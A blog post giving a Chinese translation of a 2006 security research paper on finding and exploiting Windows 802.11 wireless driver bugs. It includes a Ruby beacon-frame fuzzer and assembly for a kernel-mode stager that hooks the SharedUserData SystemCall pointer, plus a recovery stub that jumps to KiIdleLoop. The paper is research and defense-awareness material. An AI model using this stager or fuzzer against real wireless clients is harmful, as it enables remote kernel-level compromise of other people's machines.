---
layout: post
title: "Exploiting 802.11 Wireless Driver Vulnerabilities on Windows 中文全译（Uninformed 第 6 卷，Johnny Cache、H D Moore、skape，2006）"
categories: essay
series: uninformed
series_order: 5
---

> 整理自 Uninformed 第 6 卷（2006 年 11 月）Johnny Cache、H D Moore 与 skape 的《Exploiting 802.11 Wireless Driver Vulnerabilities on Windows》全文翻译——无线网卡驱动还在内核里解析未认证帧的年代，如何从空口一路打进 ring 0：攻击面测绘、注包、模糊找洞、四段式内核载荷与 Metasploit 3.0 集成，再加 Broadcom、D-Link、NetGear 三个真实驱动漏洞的完整案例。本文为 Uninformed 全译系列第 5 篇。原文：http://www.uninformed.org/?v=6&a=2&t=txt

---

> 译者注：原文《Exploiting 802.11 Wireless Driver Vulnerabilities on Windows》，作者 Johnny Cache、H D Moore、skape，发表于安全技术期刊《Uninformed》第 6 卷（Vol 6），日期 2006 年 11 月。原文链接：http://www.uninformed.org/?v=6&a=2&t=txt 。本译文为全文翻译，不删节、不摘要化；代码、转储、函数名、数值与协议字段名保持原文，专有名词首次出现时给出中文说明；原文自身的笔误与前后不一致之处均照译并加译注标注，未擅自改动。本文在《Uninformed 全集精彩文章导读》中列为精选第 13 篇，将作为博客「Uninformed 全译系列」第 5 篇发布。


11/2006
Johnny Cache (johnycsh[a t]802.11mercenary.net)
H D Moore (hdm[a t]metasploit.com)
skape (mmiller[a t]hick.org)

## 1) Foreword / 前言

摘要：本文描述在 Windows 上识别并利用 802.11 无线设备驱动程序漏洞的过程。802.11 是无线局域网（Wireless Local Area Network，WLAN）的一组协议标准，通俗所说的 Wi-Fi 即以其为基础。这一过程按两个步骤来描述：利用前阶段（pre-exploitation）与利用阶段（exploitation）。利用前阶段对 802.11 协议作了基础介绍，并描述了作者用来创建一个基础 802.11 协议模糊测试器（fuzzer，即通过自动生成并发送大量畸形或随机数据来触发程序缺陷的测试工具）的工具与库。利用阶段描述了一个 802.11 无线设备驱动程序利用（exploit，即利用漏洞执行攻击者意图代码的程序或过程）所共有的要素。这些要素包括：在 Windows 内核模式（kernel-mode，即代码在操作系统内核特权层运行的状态，下文详述）下执行任意代码时所用的底层载荷（payload，即漏洞触发后实际执行的代码）架构、这一载荷架构如何被集成进 Metasploit Framework（一个开源的漏洞利用开发与执行框架）3.0 版，以及 Metasploit Framework 对外提供的、使开发 802.11 无线设备驱动程序利用变得容易的接口。最后，本文以三个真实世界中的无线设备驱动程序漏洞作为案例研究，来说明这一过程的应用。希望本文对这一过程的描述与例证能够表明：内核模式漏洞完全可以像用户模式漏洞一样危险、一样容易利用。从而提高人们对更强健的内核模式漏洞利用防范技术之必要性的认识。

致谢：作者感谢 David Maynor、Richard Johnson 和 Chris Eagle。

## 2) Introduction / 引言

在过去十年间，软件安全已经成熟了许多。它从一个鲜为企业所关注的冷门问题，变成了催生出一个完整行业的事物。曾经认为在软件安全上投入资源没什么价值的企业，如今拥有整支专门致力于根除安全问题的团队。这种态度转变的原因无疑是多方面的，但可以说，最大的影响来自利用（exploitation）技术的进步——这些技术可被用来利用软件漏洞。正是这些技术的不断精进，使得可靠的利用可以在完全不了解漏洞细节的情况下被使用。这一转变，实际上消除了许多企业一直依赖着的那根本就细弱的「入门门槛」拐杖——即因利用门槛高而产生的自满心理。

无论利用技术的精进是否确实是那个转折点，事实是，如今已经存在一个以软件安全之名诞生出来的行业。就本文的目的而言，特别值得关注的是这一行业中那些投入时间研究并实现试图解决漏洞利用防范问题的方案的企业与个人。由于这些时间投入，像不可执行页（non-executable pages，即被标记为不可执行代码的内存页，用于阻止在数据页中执行代码）、地址空间布局随机化（address space layout randomization，ASLR，即随机化程序内存布局以增加利用难度）、栈金丝雀（stack canaries，即放在栈缓冲区与保存的返回地址之间、返回前校验是否被改写的哨兵值）以及其他新颖的防范措施，正在桌面市场变得常见。尽管主流集成这些技术中的许多项是好事，这一点无可争辩，但这里存在一个问题。

这个问题的核心在于：迄今为止，多数漏洞利用防范方案在实现上都有点目光狭隘。具体来说，这些方案通常只专注于在一种上下文中防范利用：用户模式（user-mode，即普通应用程序在受限特权下运行的状态，与内核模式相对）。并非所有情况都如此。作者想特别说明，像 PaX 团队的 grsecurity 这类方案，已经支持有助于提供内核级安全性的功能。此外，栈金丝雀实现早就存在，并已集成进许多主流内核。然而，并非所有设备驱动程序在编译时都利用了这些新增强功能。这种目光狭隘常被这样辩护：内核模式漏洞一直以来远没有那么普遍。而且，与用户模式漏洞相比，内核模式漏洞被多数人认为需要复杂得多的攻击。

内核模式漏洞的普遍程度可以有许多不同的解读。最天真的解读是认为内核模式漏洞确实很少。毕竟，这些代码本应经受过严苛的代码覆盖测试。第二种解读可能认为，内核模式漏洞更复杂，因而更难发现。第三种解读则可能是，专注于寻找内核模式漏洞的人更少。虽然肯定还有其他因素，作者认为，问题最好由第二与第三种解读来概括。

即便普遍程度是受内核模式漏洞相对更难利用这一因素影响，那仍然是个蹩脚的借口，不足以让漏洞利用防范方案就此干脆忽略它。过去已经表明，用户模式漏洞的利用技术被精进到了能造出越来越可靠的利用的程度。这些越来越可靠的利用随后被整合进自动化蠕虫（worm，即能自我传播的恶意程序）中。内核模式漏洞又有什么不同呢？诚然，它们很复杂，但堆溢出（heap overflows，即堆内存缓冲区溢出）当年不也一样复杂吗？作者看不出任何理由认为内核模式漏洞不会也经历一段现有利用技术在公开层面革命性进步的时期。事实上，这一时期已经开始了[5,2,1]。可大多数企业似乎仍乐于依赖同一套拐杖，等着有人证明问题真的存在。希望本文能帮助把这一点讲清楚：内核模式漏洞完全可以像用户模式漏洞一样容易利用。

内核模式漏洞的存在，实在不应该让人感到意外。对防范用户模式漏洞利用的高度关注，已经导致内核模式安全落在了后面。这种滞后还被另一个事实进一步加剧：编写内核模式软件的开发者，通常必须具备与大多数用户模式开发者所习惯的完全不同的心态。（译注：原文此处作 “acustomed”，系 “accustomed”（习惯的）之笔误，译文按 accustomed 译出。）无论程序员面对的是哪种操作系统，这一点都成立（只要它是一个在系统与用户之间有明确分隔的、以任务为导向的操作系统）。决定试着为 NT 编写设备驱动程序的用户模式程序员，会发现自己要面对好几个意想不到的状况。最明显的一点是，旧的 Windows 驱动程序模型（Windows Driver Model，WDM，即微软早期的驱动开发模型）和新的 Windows 驱动程序框架（Windows Driver Framework，WDF，即微软较新的驱动开发框架），所代表的应用程序编程接口（API）与用户模式开发者所熟悉的完全不同。仍有一些标准 C 运行时（runtime，即运行时库）构件可以使用，但它们在设备驱动代码中的使用会显得格外扎眼。这一事实并没有阻止开发者使用危险的字符串函数。

虽然 API 完全不同无疑是一个大障碍，但还有许多其他「坑」（gotchas），是用户模式程序员通常不会发现自己需要担心的。其中对设备驱动开发者施加的最有意思的限制之一，是栈空间的节约。在现代的 NT 衍生系统上，内核模式线程只被提供 3 页（12288 字节）的栈空间。在用户模式下，线程栈通常可以增长到 256KB 之大（这一默认限制由可执行二进制文件的可选头（optional header）控制）。由于内核模式线程栈空间有限，在一个栈帧（stack frame，即一次函数调用在栈上占用的区域）内消耗大量空间的设备驱动应该很少见。然而，人们观察到，Intel Centrino 驱动中有多处函数的实例，消耗了超过 1 页的栈空间。那是在一个栈帧内就浪费掉了可用栈空间的 33%！

也许所有差异中最重要的是，在处理性能、错误处理与可重入性（re-entrancy，即同一段代码能在前一次执行尚未结束时再次被进入并正确工作）这类事情时，必须格外小心。这些重要要素对于确保操作系统整体的稳定性至关重要。如果程序员在用户模式下对这些事情中的任何一项处理疏忽，最坏也不过是应用程序崩溃。而在内核模式下，未能恰当地顾及这些要素中的任何一项，通常都会影响整个系统的稳定性。更糟的是，设备驱动中与安全相关的缺陷提供了一个暴露点，可导致超级用户（super-user，即最高特权）权限。

从这一非常简短的引言出发，希望读者开始意识到，设备驱动开发是一个不同的世界。这是一个充满了更多限制与问题的世界，在那里软件缺陷的影响远大于人们通常在用户模式下所见。这是一个尚未在漏洞利用防范技术方面得到足够关注的世界，因而使得改进和精进内核模式利用技术成为可能。这样一个世界会吸引研究人员与折腾者（tinkerers），应该不足为奇。

事实上，正是这种吸引力，构成了本文的主要动机之一。虽然作者将严格聚焦于用来识别并利用无线设备驱动程序缺陷的过程，但应当指出，其他设备驱动程序同样很可能容易出现安全问题。然而，大多数其他设备驱动程序都不具备这样一个特点：向附近所有设备暴露一个无连接的二层（layer2，即数据链路层，OSI 模型第二层）攻击面（attack surface，即可被攻击者触及并尝试利用的入口总和）。坦率地说，还有什么能比这更酷的呢？那只会发生在电影里，对吧？

作为开端，本文的结构如下。在第 3 章中，描述了用来在无线设备驱动程序中寻找漏洞的步骤，例如通过模糊测试（fuzzing，即前述使用 fuzzer 的测试方法）来寻找。第 4 章解释了实际利用一个设备驱动漏洞来执行任意代码的过程，以及 Metasploit Framework 3.0 版如何被扩展以使处理这一问题变得轻而易举。最后，第 5 章提供了三个真实世界中的无线设备驱动程序漏洞实例。每个真实世界实例都描述了该漏洞从最初发现到任意代码执行的全过程，其间的种种考验与磨难。

## 3) Pre-Exploitation / 利用前阶段

本章介绍作者用来识别 802.11 无线设备驱动程序漏洞的工具与策略。第 3.1 节对 802.11 协议作一基本描述，以便为读者提供理解 802.11 设备驱动程序所暴露的攻击面（Attack Surface，指系统可被攻击者触及和利用的全部入口与处理逻辑的总和）所必需的信息。第 3.2 节描述 Metasploit Framework（Metasploit 框架，一套开源的渗透测试与漏洞利用开发框架）3.0 版本所暴露的基本接口，该接口使得构造任意 802.11 数据包成为可能。最后，第 3.3 节描述一种基本方法，用于对设备驱动程序处理某些 802.11 协议功能的某些方面进行模糊测试（Fuzzing，指通过向目标输入大量变异的、通常是畸形的数据，观察其是否崩溃从而发现缺陷的测试方法）。

### 3.1) Attack Surface / 攻击面

设备驱动程序同样会遭受适用于任何其他用 C 编程语言编写的代码的同类漏洞。缓冲区管理不当、有缺陷的指针运算以及整数溢出，都可能导致可利用的情形。设备驱动程序的缺陷常常被视为低风险问题，因为大多数驱动程序并不处理攻击者可控的数据。当然，例外是网络设备的驱动程序。虽然以太网设备（及其驱动程序）早已存在，但驱动程序所必须处理的内容非常简单，这极大地限制了攻击面。无线驱动程序则被要求处理范围更广的请求，并且还被要求将这些功能暴露给无线设备作用范围内的任何人。

在 802.11 设备驱动程序的世界里，攻击面会根据设备的状态而变化。三种主要状态是：

  1. Unauthenticated and Unassociated（未认证且未关联）
  2. Authenticated and Unassociated（已认证且未关联）
  3. Authenticated and Associated（已认证且已关联）

在第一种状态下，客户端并未连接到某个特定的无线网络。这是 802.11 驱动程序的默认状态，也将是本节重点讨论的状态。802.11 协议定义了三种不同类型的帧（Frame，指在链路层传输的数据单元）：Control（控制帧）、Management（管理帧）和 Data（数据帧）。这些帧类型又进一步被划分为三类（class 1、2 和 3）。在 Unauthenticated and Unassociated（未认证且未关联）状态下，只处理第一类（class 1）中的帧。

以下 802.11 管理子类型会在客户端处于状态 1 时被处理[3]：

  1. Probe Request（探测请求）
  2. Probe Reponse（探测响应；译注：原文如此拼写，应为 Probe Response，系原文笔误，照录于此）
  3. Beacon（信标）
  4. Authentication（认证）

Probe Response（探测响应）和 Beacon（信标）子类型被无线设备用来发现和通告本地无线网络。客户端也可以发送 Probe Response 来发现网络（详见下文）。Authentication（认证）子类型被用来加入某个特定的无线网络，并进入第二种状态。

无线客户端以两种不同的方式发现可用网络列表。在 Active Mode（主动模式）下，客户端会发送一个 SSID（Service Set Identifier，服务集标识符，即无线网络的人类可读名称）字段为空的 Probe Request（探测请求）。作用范围内的任何接入点（Access Point，AP，无线接入点）都会回复一个 Probe Response（探测响应），其中包含它所服务的无线网络的参数。另外，客户端也可以指定它正在寻找的 SSID。在 Passive Mode（被动模式）下，客户端会监听 Beacon 请求，并从信标中读取网络参数。由于这两种方法都会产生一个包含无线网络信息的帧，因此帧格式相似是合理的。客户端所选用的方法由设备的能力以及使用该驱动程序的应用程序决定。

一个信标帧包括一个通用的 802.11 头部，该头部定义了数据包类型、源、目的地、Basic Service Set ID（BSSID，基本服务集标识符，通常对应接入点的 MAC 地址）以及其他信封信息。信标还包括一个固定长度的头部，该头部由时间戳（timestamp）、信标间隔（beacon interval）和能力字段（capabilities field）组成。在固定长度头部之后是一个或多个 Information Elements（IEs，信息元素），它们是可变长度字段，包含接入点信息的主体部分。一个探测响应帧与信标帧几乎完全相同，只是其目的地地址被设置为客户端的地址，而信标则将其设置为广播地址。

信息元素由一个 8 位类型字段、一个 8 位长度字段，以及最多 255 字节的数据组成。这种结构类型与许多不同协议中使用的常见的 Type-Length-Value（TLV，类型-长度-值）形式非常相似。对于大多数无线客户端而言，Beacon 和探测响应数据包要想被处理，必须包含一个 SSID IE、一个 Supported Rates IE（支持速率信息元素）和一个 Channel IE（信道信息元素）。

802.11 规范规定，SSID 字段（某个给定无线网络的人类名称）长度不应超过 32 字节。然而，一个信息元素的最大长度是 255 字节。这就为编写不良的无线驱动程序留下了相当大的出错空间。无线驱动程序支持大量不同类型的信息元素。该标准甚至还包括对专有的、厂商特定的 IE 的支持。

### 3.2) Packet Injection / 数据包注入

为了攻击驱动程序的信标和探测响应处理代码，需要一种向设备发送原始 802.11 帧的方法。尽管发送原始 802.11 数据包的能力并不是大多数无线网卡所支持的功能，但许多开源驱动程序可以被说服通过一个小补丁来集成对此的支持。少数驱动程序甚至原生支持它。在 Linux 操作系统下，有广泛的硬件和驱动程序支持原始数据包注入（Packet Injection，指由用户程序直接构造并发送链路层原始帧）。不幸的是，每个驱动程序为访问这一功能所提供的接口都略有不同。为了支持许多不同的无线网卡，需要一种与硬件无关的发送原始 802.11 帧的方法。

解决方案是 LORCON 库（Loss of Radio Connectivity，无线电连接丢失），由 Mike Kershaw 和 Joshua Wright 编写。该库为通过多种受支持的驱动程序发送原始 802.11 数据包提供了一个标准化的接口。然而，该库是用 C 编写的，默认并不暴露任何 Ruby 绑定。为了能够从 Ruby 与该库交互，创建了一个新的 Ruby 扩展（ruby-lorcon），它与 LORCON 库对接，并暴露一个简单的面向对象接口。这个封装接口使得从 Ruby 脚本发送任意无线数据包成为可能。

从 Metasploit 模块调用 ruby-lorcon 接口最简单的方式是通过一个 mixin（混入模块，指在 Ruby 中将一个模块的功能混入到类或模块中以复用代码的机制）。Mixin 在 Metasploit Framework 3.0 版本中被用来提高代码复用，并允许任何模块只需包含合适的 mixin 即可导入丰富的功能集。现有的用于 LORCON 的 mixin 提供了三个新的用户选项，以及一个用于打开接口、发送数据包和更改信道的简单 API。

```
+-----------+----------+----------+--------------------------------------------+
| Name      | Default  | Required | Description                                |
+-----------+----------+----------+--------------------------------------------+
| CHANNEL   | 11       | yes      | The default channel number                 |
| DRIVER    | madwifi  | yes      | The name of the wireless driver for lorcon | 
| INTERFACE | ath0     | yes      | The name of the wireless interface         |
+-----------+----------+----------+--------------------------------------------+
```

一个想要发送原始 802.11 数据包的 Metasploit 模块应当包含 Msf::Exploit::Lorcon mixin。当使用这个 mixin 时，模块可以利用 wifi.open() 打开接口，利用 wifi.write() 发送数据包。用户将为其特定的硬件和驱动程序指定 INTERFACE 和 DRIVER 选项。802.11 数据包本身的创建则留给模块开发者来处理。

### 3.3) Vulnerability Discovery / 漏洞发现

发现新缺陷最快的方法之一是通过使用模糊测试器（fuzzer）。一般而言，模糊测试器是一个程序，它迫使应用程序处理高度变异的、通常是畸形的数据，希望其中某一次尝试会导致崩溃。对无线设备驱动程序进行模糊测试，依赖于设备处于特定帧会被处理的状态，以及一个能够发送很可能导致崩溃的帧的工具。在本章第一部分，作者描述了无线客户端的默认状态，以及在该状态下会被处理的管理帧类型。

本文将重点关注的两种帧类型是 Beacon（信标）和 Probe Response（探测响应）。这些帧具有以下结构：

```
   +------+----------------------+
   | Size | Description          |
   +------+----------------------+
   |  1   | Frame Type           |
   |  1   | Frame Flags          |
   |  2   | Duration             |
   |  6   | Destination          |
   |  6   | Source               |
   |  6   | BSSID                |
   |  2   | Sequence             |
   |  8   | Timestamp            |
   |  2   | Beacon Interval      |
   |  2   | Capability Flags     |
   |  Var | Information Elements |
   |  2   | Frame Checksum       |
   +------+----------------------+
```

Information Elements（信息元素）字段是一个可变长度结构的列表，由一个字节的类型字段、一个字节的长度字段，以及最多 255 字节的数据组成。可变长度字段通常是模糊测试的良好目标，因为它们在数据包被解析时需要特殊处理。为了攻击一个使用 Passive Mode（被动模式）来发现无线网络的驱动程序，有必要用被篡改的 Beacon 向目标泛洪。为了攻击一个使用 Active Mode（主动模式）的驱动程序，有必要用被篡改的 Probe Response 向目标泛洪，同时迫使它扫描网络。下面的 Ruby 代码生成一个带有随机化 Information Element 数据的 Beacon 帧。Frame Checksum（帧校验和）字段由驱动程序自动添加，不需要包含在内。

```
#
# Generate a beacon frame with random information elements
#

# Maximum frame size (max is really 2312)
mtu      = 1500

# Number of information elements
ies      = rand(1024)

# Randomized SSID
ssid     = Rex::Text.rand_text_alpha(rand(31)+1)

# Randomized BSSID
bssid    = Rex::Text.rand_text(6)

# Randomized source
src      = Rex::Text.rand_text(6)

# Randomized sequence
seq      = [rand(255)].pack('n')

# Capabiltiies
cap      = Rex::Text.rand_text(2)

# Timestamp
tstamp   = Rex::Text.rand_text(8)

frame =
	"\x80" +                      # type/subtype (mgmt/beacon)
	"\x00" +                      # flags
	"\x00\x00" +                  # duration  
	"\xff\xff\xff\xff\xff\xff" +  # dst (broadcast)
	src   +                       # src
	bssid +                       # bssid
	seq   +                       # seq  
	tstamp +                      # timestamp value
	"\x64\x00" +                  # beacon interval
	cap                           # capabilities

	# First IE: SSID
	"\x00" + ssid.length.chr + ssid +

	# Second IE: Supported Rates
	"\x01" + "\x08" + "\x82\x84\x8b\x96\x0c\x18\x30\x48" +

	# Third IE: Current Channel
	 "\x03" + "\x01" + channel.chr

# Generate random Information Elements and append them 
1.upto(ies) do |i|
	max = mtu - frame.length
	break if max < 2
	t = rand(256)
	l = (max - 2 == 0) ? 0 : (max > 255) ? rand(255) : rand(max - 1)
	d = Rex::Text.rand_text(l)
	frame += t.chr + l.chr + d
end
```

虽然这只是一个针对特定帧的简单 802.11 模糊测试器的例子，但完全可以实现复杂得多的、具备状态感知能力的模糊测试器，使之能够对无线设备驱动程序的其他数据包处理区域进行模糊测试。

## 4) Exploitation 漏洞利用

通过使用 fuzzer（模糊测试器，即自动生成大量随机或畸形输入以触发程序缺陷的工具），或者通过人工分析发现一个问题之后，就有必要着手寻找一种方法，可靠地取得对指令指针（instruction pointer，即决定处理器下一条执行哪条指令的寄存器）的控制权。就 Windows 上基于栈的缓冲区溢出（stack-based buffer overflow）而言，这个过程往往很简单：确定返回地址的偏移量，然后用一条能跳回栈中的指令的地址覆写该返回地址。不过，那只是最理想的情形；无论漏洞存在于设备驱动程序中，还是存在于用户模式程序中，人们往往还不得不跨越其他种种障碍。正是这些障碍和其他因素，使得可靠地取得指令指针控制权这一过程，往往成为漏洞利用开发中最具挑战性的步骤之一。作者们不打算穷尽式地描述人们可能遇到的所有问题，而是以第 5 章中给出的真实世界示例的形式来加以说明。

假定已经能够可靠地取得指令指针的控制权，漏洞利用的开发通常就会转入其最后阶段：任意代码执行（arbitrary code execution）。在用户模式下，这个阶段对大多数漏洞利用开发者来说已经完全自动化了。直接使用 Metasploit 的用户模式载荷生成器，已经成为通行做法。另一方面，内核模式载荷（kernel-mode payload）却还没有出现过一种集成化的解决方案，能够产出可靠的、可以投放进任何漏洞利用中的载荷。这当然不是说此前没有关于内核模式载荷的工作——此前肯定有过[2,1]——而是说，它们的形态迄今为止还算不上特别容易采纳。内核模式载荷缺少这种易用性，可以被视为没有出现大量公开、可靠的内核模式漏洞利用的主要原因之一。

由于本文的目标之一是说明内核模式漏洞利用可以写得和用户模式漏洞利用一样容易，作者们认定有必要把现有的成套内核模式载荷构想纳入 Metasploit 框架的 3.0 版本，使其可以被今后任何内核模式漏洞利用自由使用。虽然这次最终集成当然是终极目标，但在集成得以进行之前，还有若干重要步骤必须先完成。下文各节将试图交代这一背景。在 4.1 节中，将详细描述作者们所选定的载荷架构。该节还包括对 Metasploit Framework 3.0 版本中已公开的接口的描述，供那些希望实现内核模式漏洞利用的开发者使用。

### 4.1) Payload Architecture 载荷架构

作者们决定集成的载荷架构，很大程度上奠基于此前研究[1]。如引言中已暗示的那样，在处理内核模式漏洞利用时，必须考虑许多复杂的因素。这些因素中的绝大多数，直接关系到在内核中执行任意代码时应当使用什么方法。例如，如果一个设备驱动程序在漏洞利用被触发之时正持有一把锁，那么为了恢复系统、使人们事后仍能有意义地与之交互，释放那把锁的最佳办法可能是什么？其他类型的考虑还包括 IRQL（Interrupt Request Level，中断请求级别，即内核用来表示当前执行优先级、并据此决定哪些操作被允许的级别）限制、清理已损坏的数据结构，等等。正是这些考虑，使得针对某个特定漏洞，载荷的最佳实现方式可以有很多种。这与用户模式环境大不相同：在用户模式下，几乎总是可以对任何应用程序都使用完全相同的载荷。

尽管这些依情形而异的复杂情况确实存在，人们还是有可能设计并实现一套几乎适用于任何情形的载荷系统。通过把内核模式载荷拆分为可变的组件（component），就可以用不同的方式把组件组合起来，形成最适合特定情形的功能变体。在《Windows Kernel-mode Payload Fundamentals》[1] 中，内核模式载荷被拆分为四个不同的组件：migration（迁移）、stagers（stager，暂存投送组件，即先行执行、为后续载荷铺路并将其转移到合适执行环境中的小段代码）、recovery（恢复）和 stages（stage，载荷主体段，即最终要执行的任意代码段）。

用组件来描述内核模式载荷时，migration 组件（迁移组件）是用来把执行从一个不安全的执行环境迁移到一个安全的执行环境的组件。例如，如果漏洞被触发时 IRQL 处于 DISPATCH 级别，就可能有必要迁移到一个更安全的 IRQL，例如 PASSIVE 级别。迁移组件并非总是必需的。stager 组件的用途，是把载荷的某一部分转移过去，使其在另一个线程的上下文中执行。如果当前线程至关重要，或者倘若使用某些操作就可能导致系统死锁，那么这一步就可能是必要的。使用 stager 可以免除对迁移组件的需要。recovery 组件（恢复组件）是用来把系统恢复到一个干净状态、然后继续执行的组件。这类组件一般可能需要针对某个给定漏洞进行定制，因为要以通用方式描述恢复系统所需的步骤并不总是可能的。例如，如果在漏洞被触发之时有锁被持有，就可能有必要找到办法释放那些锁，然后从一个安全点继续执行。最后，stage 组件是包罗一切的兜底组件，承载载荷一旦在安全环境中运行之后所要执行的任何任意代码。

作者们决定采用的，正是这套用以描述内核模式载荷的模型。为了更好地理解这套模型如何工作，看起来最好的办法是描述它如何应用于第 5 章中展示的全部三个真实世界漏洞。这三个漏洞实际上使用的是同一个基本的底层载荷，为简洁起见，下文将称其为“the payload”（该载荷）。该载荷本身由四个组件中的三个组成。下面将逐个讨论该载荷的每个组件，然后再将其作为整体讨论，以呈现该载荷如何运作的大致图景。

该载荷中存在的第一个组件是一个 stager 组件。作者们选择使用的 stager，建立在 [1] 中描述的 SharedUserData SystemCall Hook stager（基于 SharedUserData 的 SystemCall 钩子的 stager）之上。在理解这个 stager 如何工作之前，先了解几件事是重要的。顾名思义，这个 stager 是通过钩住（hooking，即拦截并重定向原有的调用路径）SharedUserData（用户模式与内核模式共享的数据页）中名为 SystemCall 的属性，来达成其目标的。作为参照，SharedUserData 是一个在用户模式和内核模式之间共享的全局页。它相当于一种全局结构，其中包含诸如滴答计数（tick count）和时间信息、版本信息，以及相当多其他东西。它极为有用，原因有几个，其中尤为重要的一个原因是：在所有 NT 衍生系统上，它在用户模式和内核模式中都位于一个固定地址。这意味着这个 stager 立刻就具备可移植性，并且不需要执行任何符号解析（symbol resolution）来定位该地址，从而有助于使载荷的总体体积保持小巧。

被钩住的 SystemCall 属性，是 Windows XP 中新增的一项增强的一部分。设计这项增强的目的，是使人们能够根据给定机器上存在何种硬件支持，来使用经过优化的系统调用指令。在 Windows XP 之前，系统调用是通过硬编码地使用 int 0x2e 软中断，从用户模式被分发（dispatch）的。随着时间推移，硬件方面出现了降低执行系统调用所涉开销的增强，例如 sysenter 指令的引入。由于微软并不做为不同厂牌、不同型号的硬件提供不同版本 Windows 的生意，他们决定在运行时确定要使用哪一种系统调用接口。SharedUserData 是存放这一运行时判定结果的理想候选者，因为它本来就是一个已存在于每个用户模式进程中的共享页。作出这些改动之后，ntdll.dll 被更新为通过 SharedUserData 分发系统调用，而不是通过硬编码地使用 int 0x2e。这一新的系统调用分发接口的最初实现，把可执行代码放置在 SharedUserData 的 SystemCall 属性之内。后续版本的 Windows，例如 XP SP2，则把 SystemCall 属性变成了一个函数指针。

把 SystemCall 属性引入 SharedUserData，有一个重要的含义：它代表了一个枢纽点，用户模式中所有的系统调用分发都要经过它。在先前版本的 Windows 中，每个用户模式系统调用存根例程（stub routine，即仅做参数整理并转入内核的薄封装例程）都直接调用 int 0x2e。在最新版本中，这些存根例程则通过 SystemCall 函数指针进行间接调用。默认情况下，这个函数指针被初始化为指向 ntdll.dll 中的几个导出符号之一。然而，倘若这个函数指针被改成指向别处，其含义便意味着：有可能拦截所有进程中的全部系统调用。正是这一含义，构成了该载荷所用 stager 的最根本基础。

当 stager 开始执行时，它正运行在内核模式下，处于触发了该漏洞的那个线程的上下文中。它采取的第一个动作，是使用可预测的地址 0xffdf037c，把一块代码（即 stage）复制到 SharedUserData 的一个未使用部分中。复制操作完成后，stager 接着钩住 SystemCall 属性。这一钩子必须依据目标操作系统是否为 XP SP2 之前的版本而作不同处理。关于如何处理这一点的更多细节，见 [1] 中的描述。不论采用哪种方法，SystemCall 属性最终都会被重定向为指向 0x7ffe037c。这个可预测的位置，就是 stage 被复制进去的那部分未使用的 SharedUserData 的用户模式可访问地址。钩挂操作完成后，用户模式进程调用的所有系统调用，都会先经过放置在 0x7ffe037c 处的 stage。该载荷的 stager 部分大致如下所示（注意，这一实现仅被设计为能在 XP SP2 和 Windows 2003 Server SP1 上工作。若要使其在先前版本的 XP 和 2003 上工作，需要作出修改）：

```
; Jump/Call to get the address of the stage
00000000  EB38              jmp short 0x3a
00000002  BB0103DFFF        mov ebx,0xffdf0301
00000007  4B                dec ebx
00000008  FC                cld
; Copy the stage into 0xffdf037c
00000009  8D7B7C            lea edi,[ebx+0x7c]
0000000C  5E                pop esi
0000000D  6AXX              push byte num_stage_dwords
0000000F  59                pop ecx
00000010  F3A5              rep movsd
; Set edi to the address of the soon-to-be function pointer
00000012  BF7C03FE7F        mov edi,0x7ffe037c
; Check to make sure the hook hasn't already been installed
00000017  393B              cmp [ebx],edi
00000019  7409              jz 0x24
; Grab SystemCall function pointer
0000001B  8B03              mov eax,[ebx]
0000001D  8D4B08            lea ecx,[ebx+0x8]
; Store the existing value in 0x7ffe0308
00000020  8901              mov [ecx],eax
; Overwrite the existing function pointer and make things live!
00000022  893B              mov [ebx],edi

; recovery stub here

0000003A  E8C3FFFFFF        call 0x2

; stage here
```

钩子就位之后，stager 已经完成了它的主要任务，即把一个 stage 复制到一个它将来能够在其中被执行的位置。在 stage 能够执行之前，stager 必须让该载荷的 recovery 组件先执行。如前所述，recovery 组件代表着任何内核模式载荷中最具漏洞针对性的部分之一。就第 5 章所述的漏洞利用而言，一个特殊用途的 recovery 组件是必需的。

之所以需要这个特定的 recovery 组件，是因为示例漏洞是在 Idle thread（空闲线程，即处理器空闲时运行的特殊内核线程）的上下文中被触发的。在 Windows 上，Idle thread 是一个特殊的内核线程，每当一个处理器空闲时它就执行。由于 Idle thread 的运作方式的性质，对它执行诸如让该线程自旋（spinning）之类的操作，或者 [1] 中描述的任何其他恢复方法，都是危险的。应用 [2] 中讨论的在 Idle thread 内延迟执行的技术，或许也是可能的。最终选定的恢复方法包含两个基本步骤。第一，把当前处理器的 IRQL 恢复到 DISPATCH 级别，以防它当时正在更高的 IRQL 上执行。第二，在适当地初始化寄存器之后，把执行控制权转移到 nt!KiIdleLoop 的第一条指令。最终效果是：空闲线程重新从头开始执行；如果一切顺利，系统会像什么都没有发生过一样继续运行。在实践中，这种恢复方法已被证明是可靠的。然而，它所具有的一个负面之处在于，它需要知道 nt!KiIdleLoop 所在位置的地址（译注：原文此处作 “the one negative that it is has is”，语序有误，疑为 “the one negative that it has is” 之笔误；此处按后者照译，不擅自改动原意）。这种依赖代表着一个成熟的、留待将来改进的领域。不论有何局限，该载荷的 recovery 组件看起来如下面的代码所示：

```
; Restore the IRQL
00000024  31C0              xor eax,eax
00000026  64C6402402        mov byte [fs:eax+0x24],0x2
```

```
; Initialize assumed registers
0000002B  8B1D1CF0DFFF      mov ebx,[0xffdff01c]
00000031  B827BB4D80        mov eax,0x804dbb27
00000036  6A00              push byte +0x0
; Transfer control to nt!KiIdleLoop
00000038  FFE0              jmp eax
```

恢复组件（recovery component，即载荷主体执行完之后负责把处理器状态与执行流恢复到可继续正常运行状态的那部分代码）执行完毕之后，所有最初在内核模式（kernel-mode，即代码以操作系统内核的最高特权级运行的状态）下执行的载荷（payload，即漏洞触发后实际执行的代码）代码就都执行完了。载荷中最后剩下待执行的部分，是由分级器（stager，即先行执行、负责把后续主体代码装载到位并把控制权转交给它的小段先导代码）复制过去的那份级载荷（stage，即由 stager 装载、随后执行的主体载荷代码）。这份 stage 本身在所有进程上下文中以用户模式（user-mode，即代码以普通应用程序的受限特权级运行的状态）运行，并且每当一次系统调用（system call，即用户模式程序请求内核提供服务的调用）被分发时它都会执行。这意味着什么，应该是显而易见的：让一份 stage 在每一个进程里、每当发生一次系统调用时都执行，这简直就是在自找麻烦。因此，设计一份通用的用户模式 stage、让它能把自己的执行次数限制在某一个特定上下文中，就是合理的了。

